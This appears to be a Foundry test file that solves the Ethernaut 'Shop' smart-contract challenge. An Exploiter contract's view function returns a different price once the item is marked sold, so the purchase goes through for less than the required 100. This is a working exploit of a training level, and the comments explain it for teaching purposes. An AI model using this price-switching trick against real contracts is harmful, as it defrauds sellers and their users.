// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Shop.sol";
import "src/levels/ShopFactory.sol";

contract TestShop is BaseTest {
    Shop private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ShopFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Shop(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.isSold(), false);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // This challenge was pretty
        // The `Shop` contract expect our `Buyer` contract to return
        // The price it's willing to pay to buy the item
        // But it is expecting that that price will not change the second time we call it
        // Because it thinks that `price` being a `view` function cannot change it's behaviour by
        // updating an internal variable and return a different value based on that
        // A `view` function cannot modify the state of the contract. In particular it cannot
        // - Write to state variables.
        // - Emit events.
        // - Create other contracts.
        // - Use selfdestruct.
        // - Send Ether via calls.
        // - Call any function not marked view or pure.
        // - Use low-level calls.
        // - Use inline assembly that contains certain opcodes.
        //
        // More info ->
        // - https://docs.soliditylang.org/en/v0.8.15/contracts.html#view-functions

        // So we cannot modify an internal variable
        // but we can call the `Shop` getter function for the `isSold` variable
        // that is updated before calling for the second time the `price` function
        // By doing so we can trick the `Shop` contract to use a lower price instead of
        // a price `>= 100`.

        // deploy the exploiter contract
        Exploiter exploiter = new Exploiter();

        // trigger the exploit and buy the item
        exploiter.buy(level);

        // assert that we have solved the challenge
        assertEq(level.isSold(), true);

        vm.stopPrank();
    }
}

contract Exploiter {
    Shop private victim;

    function buy(Shop _victim) external {
        victim = _victim;
        victim.buy();
    }

    function price() external view returns (uint256) {
        return victim.isSold() ? 1 : 1000;
    }
}
